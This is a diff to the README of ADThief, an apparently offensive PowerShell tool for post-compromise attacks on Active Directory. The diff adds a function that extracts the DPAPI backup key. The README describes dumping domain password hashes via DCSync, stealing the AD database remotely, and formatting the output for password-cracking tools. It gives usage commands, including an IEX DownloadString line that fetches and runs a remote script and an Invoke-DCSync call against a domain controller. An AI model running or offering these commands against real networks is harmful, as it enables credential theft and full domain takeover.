@@ -5,7 +5,8 @@ ADThief is a PowerShell tool to exploit Active Directory database after compromi
 ## Functions
 
 ```
-Invoke-DCSync                   -   extracts domain accounts from Active Directory, including password hashes
+Invoke-DCSync                   -   extracts domain accounts from Active Directory domain controller, including password hashes
+Get-DpapiBackupKey              -   extracts the DPAPI backup key from Active Directory domain controller
 Get-ADDatabase                  -   steals Active Directory database remotely
 Dump-ADDatabase                 -   dumps domain accounts from an offline Active Directory database, including password hashes
 Mount-ADDatabase                -   mounts an Active Directory database as a local LDAP server
@@ -14,10 +15,10 @@ Invoke-LdapSearch               -   searchs for domain objects in a mounted Acti
 
 ## Requirements
 
-The Invoke-DCSync and Get-ADDatabase functions require a privileged access to Active Directory, typically domain admin rights.
-The Dump-ADDatabase and Mount-ADDatabase functions require admin rights on the local computer.
+The functions `Invoke-DCSync`, `Get-DpapiBackupKey` and `Get-ADDatabase` require a privileged access to Active Directory, typically domain admin rights.
+The functions `Dump-ADDatabase` and `Mount-ADDatabase` require admin rights on the local computer.
 
-The Invoke-DCSync and Dump-ADDatabase functions must be launched on a computer with DSInternals PowerShell module installed. The output of these functions can be formatted using custom views provided by the DSInternals module to support different password cracking tools. The Utils.ps1 file contains a function `Add-DSAccountCustomViews` to add optional views 'SecretsDump' and 'SecretsDumpHistory'.
+The functions `Invoke-DCSync`, `Get-DpapiBackupKey` and `Dump-ADDatabase` must be launched on a computer with DSInternals PowerShell module installed. The output of these functions can be formatted using custom views provided by the DSInternals module to support different password cracking tools. The Utils.ps1 file contains a function `Add-DSAccountCustomViews` to add optional views 'SecretsDump' and 'SecretsDumpHistory'.
 
 ```
 PS C:\> Install-Module DSInternals -Scope CurrentUser
@@ -27,7 +28,7 @@ PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercon
 PS C:\> Invoke-DCSync -Server DC.ADATUM.CORP -Credential ADATUM\Administrator | Format-Custom -View SecretsDump
 ```
 
-The Mount-ADDatabase function must be launched on a computer with AD LDS installed. Please make sure to back up the NTDS.DIT file before using the option 'AllowUpgrade'. 
+The function `Mount-ADDatabase` must be launched on a computer with AD LDS installed. Please make sure to back up the NTDS.DIT file before using the option 'AllowUpgrade'. 
 
 ```
 PS C:\> Enable-WindowsOptionalFeature -FeatureName "DirectoryServices-ADAM-Client" -Online
